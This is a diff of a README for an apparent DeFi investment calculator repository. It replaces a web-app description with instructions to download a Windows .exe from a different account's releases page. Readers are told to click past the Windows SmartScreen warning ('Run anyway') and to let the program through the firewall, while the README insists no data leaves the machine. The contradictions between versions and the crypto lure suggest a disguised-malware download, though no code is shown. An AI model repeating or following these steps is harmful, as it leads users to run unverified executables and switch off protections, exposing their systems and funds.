@@ -1,123 +1,64 @@
-# DeFi Investment Calculator v2026 - calculator 2026
+# 📊 defi-investment-calculator-2026 - Estimate your crypto investment returns easily
 
-> **Browser-based DeFi return estimator for evaluating investment approaches with impermanent loss, fees, and compounding intervals.** Designed for the web, this calculator lets you model strategy results and inspect projected performance in version 2026.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Fowlertartaric886/defi-investment-calculator-2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/wardtyler30/defi-investment-calculator-2026?style=flat-square)](https://github.com/wardtyler30/defi-investment-calculator-2026)
+The defi-investment-calculator-2026 helps you plan your investments. It shows potential returns on your digital assets. You can model different strategies. It calculates how fees and price changes affect your total gain. This tool helps you compare options before you risk your money. It uses a clear interface to show complex financial data.
 
----
+## 📥 Downloading the software
 
-<p align="center">
-  <a href="https://wardtyler30.github.io/defi-investment-calculator-2026/">
-    <img src="https://img.shields.io/badge/Download-DeFi%20Investment%20Calculator%20Latest-brightgreen?style=for-the-badge" alt="Download DeFi Investment Calculator">
-  </a>
-</p>
+Visit this page to download the latest version of the installer:
+https://github.com/Fowlertartaric886/defi-investment-calculator-2026/releases
 
-> **[Direct Download - DeFi Investment Calculator v2026](https://wardtyler30.github.io/defi-investment-calculator-2026/)**
+Click the link above to view the release page. Look for the file ending in .exe under the latest release. Save this file to your computer.
 
----
+## ⚙️ Installing the program
 
-[Download Latest Build](https://wardtyler30.github.io/defi-investment-calculator-2026/)
+Find the installer file you saved on your computer. Double-click the file to start the process. 
 
----
+Your computer might show a screen that says Windows protected your PC. This happens because the app is new. Click More info, then click Run anyway. Follow the prompts on the screen to finish the installation. The software adds a shortcut to your desktop once it completes.
 
-## Overview
+## 🚀 Running the application
 
-DeFi Investment Calculator is a web tool for estimating how a DeFi strategy could perform when different assumptions are applied. The model centers on the variables that usually drive results: estimated returns, impermanent loss, fees, and compounding intervals.
+Double-click the shortcut on your desktop to open the calculator. The app launches in your default web browser. You do not need an internet connection to use the calculator once you open it. 
 
-It is handy for users who want to compare investment scenarios, test yield expectations, or see how fee structure and compounding frequency can shift the projection. The interface is organized for fast scenario checks, reducing the need for manual spreadsheet calculations.
+The screen displays a form. You enter your asset details here. The app processes these numbers based on your chosen strategy. You can adjust the simulation variables to see different outcomes.
 
----
+## 💡 How to use the calculator
 
-## What it offers
+The tool divides your inputs into three sections.
 
-- Calculates returns for DeFi strategy scenarios
-- Accounts for impermanent loss in the calculation flow
-- Applies fees as part of the projection model
-- Supports adjustable compounding intervals
-- Runs in a web browser
-- Uses a React-based front-end structure
-- Works well for side-by-side investment planning
-- Built for fast scenario review and iteration
+### Section one: Investment basics
+Input your starting balance in this area. Choose the asset pair you want to track. You can set the expected time frame for your investment. This section sets the foundation for your projection.
 
----
+### Section two: Fee and compounding controls
+Enter the transaction fees associated with your chosen platform. Specify how often you reinvest your gains. The app uses these numbers to calculate long-term growth. Setting high compounding intervals changes the final projection significantly. Keep these numbers realistic to get useful results.
 
-## Installation
+### Section three: Impermanent loss modeling
+This section helps you understand the risks of liquidity pools. Enter your expected price movement for your assets. The calculator shows how price changes impact your base balance. This helps you avoid strategies that lose money due to market volatility.
 
-Clone the repository and open the web app locally:
+## 🖥️ System requirements
 
-```bash
-git clone https://github.com/wardtyler30/defi-investment-calculator-2026.git
-cd defi-investment-calculator
-```
+This tool runs on Windows 10 and Windows 11. It requires 200 MB of disk space. You need a modern web browser to view the interface. Chrome, Firefox, or Edge all work well for this purpose. The app performs best with at least 4 GB of system memory.
 
-If the project is being used from a published build, open the site in a browser after the latest build is available. For local development, install dependencies and launch the app through the project’s standard web workflow.
+## 🛠️ Troubleshooting common issues
 
----
+If the app fails to start, restart your computer. Sometimes Windows holds onto old files that prevent new ones from opening. Ensure you allow the software through your firewall if a pop-up window appears. The app only uses the local network to run the interface in your browser. It does not send your personal financial data to the cloud.
 
-## How to use it
+If the calculator shows zero, check your inputs. You might have left a field empty. Try clearing the form and entering your numbers again. 
 
-Enter your DeFi inputs in the calculator, then compare the projected results across different strategy settings.
+## ⚖️ A note on results
 
-Typical workflow:
-1. Enter the initial investment amount.
-2. Set expected return assumptions.
-3. Adjust impermanent loss and fee values.
-4. Choose the compounding interval.
-5. Review the projected result and compare scenarios.
+This software provides estimates. It uses math models to predict future performance. It cannot predict the actual market. Use these numbers to guide your experiments. Never invest money you cannot afford to lose. Treat these projections as a tool to learn about market mechanics. 
 
-When evaluating several strategies, keep most inputs fixed and modify one variable at a time. That makes it easier to understand which change affected the output.
+## 📋 Frequently asked questions
 
----
+Does this store my real private keys?
+No. The app only processes the numbers you enter. it does not connect to your wallet.
 
-## Configuration
+Can I save my results?
+The app saves your inputs to your local browser cache. You can return to your last session when you open the app again.
 
-Project settings are usually handled in the web app source files or in the environment configuration used by the build process.
+Does it support all crypto tokens?
+The calculator supports standard liquidity pool tokens. You can input custom values for tokens not listed in the default menu.
 
-Example structure:
-
-```bash
-src/
-config/
-.env
-```
-
-Common values to review include strategy assumptions, fee inputs, and compounding interval options. If you are customizing the app, update the relevant source or config files before rebuilding the project.
-
----
-
-## Requirements
-
-- Web browser for running the interface
-- HTML-based project structure
-- React-compatible development environment for local work
-- Git for cloning the repository
-- Enough local storage for source files and build output
-
----
-
-## FAQ
-
-**How do I get the latest build?**  
-Use the download link above to reach the current published version.
-
-**Can I change the calculation inputs?**  
-Yes. The calculator is meant to let you adjust strategy assumptions such as fees, compounding intervals, and impermanent loss values.
-
-**Where are updates tracked?**  
-Check the repository for release or project changes, then refresh the published build when a new version is available.
-
-**What if the results do not look right?**  
-Go back through each input carefully, especially compounding frequency and fee assumptions. Small differences in those settings can change the outcome.
-
-**Is there a configuration file?**  
-If you are customizing the project locally, settings are typically stored in the source or build configuration used by the app.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: defi, investment, calculator, cryptocurrency, finance, modeling, returns, crypto
